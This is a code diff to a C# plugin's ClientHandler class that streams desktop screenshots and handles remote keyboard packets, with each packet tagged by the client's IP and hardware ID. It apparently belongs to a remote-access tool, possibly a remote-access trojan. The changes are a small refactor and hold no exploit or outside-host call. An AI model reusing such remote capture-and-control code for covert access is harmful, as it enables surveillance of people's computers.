@@ -42,11 +42,13 @@ namespace Plugin
         public delegate byte[] CaptureDesktopAsync();
         public CaptureDesktopAsync captureDesktop;
 
-        public ClientHandler(Host host, string key) : base()
+        public ClientHandler(Host host, string key, string baseIp, string HWID) : base()
         {
             this.hasToExit = false;
             this.host = host;
             this.key = key;
+            this.HWID = HWID;
+            this.baseIp = baseIp;
             sendDataAsync = new SendDataAsync(SendData);
             readDataAsync = new ReadDataAsync(ReceiveData);
             readPacketAsync = new ReadPacketAsync(PacketParser);
@@ -99,6 +101,7 @@ namespace Plugin
             else
                 ConnectStart();
         }
+
         private byte[] ReceiveData()
         {
             try
@@ -146,7 +149,7 @@ namespace Plugin
         {
             try
             {
-                return BufferPacket.DeserializePacket(Launch.key);
+                return BufferPacket.DeserializePacket(this.key);
             }
             catch (Exception)
             { return null;  }
@@ -170,7 +173,6 @@ namespace Plugin
 
                 case PacketType.RM_VIEW_OFF:
                     hasToExit = true;
-                    this.Dispose();
                     break;
 
                 case PacketType.RM_KEYBOARD:
@@ -283,7 +285,6 @@ namespace Plugin
         }
         private void SendDataCompleted(IAsyncResult ar)
         {
-            //int length = sendDataAsync.EndInvoke(ar);
             sendDataAsync.EndInvoke(ar);
         }
 
@@ -298,8 +299,7 @@ namespace Plugin
 
         public byte[] DesktopPicture() 
         {
-            //return Compressor.QuickLZ.Compress(Helpers.Capture(Launch.remoteViewerBasePacket.width, Launch.remoteViewerBasePacket.height, Launch.remoteViewerBasePacket.quality, Launch.remoteViewerBasePacket.format, ref vResol, ref hResol), 1);
-            return Helpers.Capture(Launch.remoteViewerBasePacket.width, Launch.remoteViewerBasePacket.height, Launch.remoteViewerBasePacket.quality, Launch.remoteViewerBasePacket.format, ref vResol, ref hResol);
+            return CaptureHelpers.Capture(Launch.remoteViewerBasePacket.width, Launch.remoteViewerBasePacket.height, Launch.remoteViewerBasePacket.quality, Launch.remoteViewerBasePacket.format, ref vResol, ref hResol);
         }
 
         public void EndDesktopPicture(IAsyncResult ar) 
@@ -308,7 +308,7 @@ namespace Plugin
             byte[] desktopPicture = captureDesktop.EndInvoke(ar);
             ar.AsyncWaitHandle.Close();
 
-            RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON, Launch.baseIp, Launch.HWID)
+            RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON, this.baseIp, this.HWID)
             {
                 desktopPicture = desktopPicture,
                 hResol = hResol,
@@ -323,6 +323,7 @@ namespace Plugin
             }
             else 
             {
+                Launch.clientHandler.Dispose();
                 return;
             }
         }
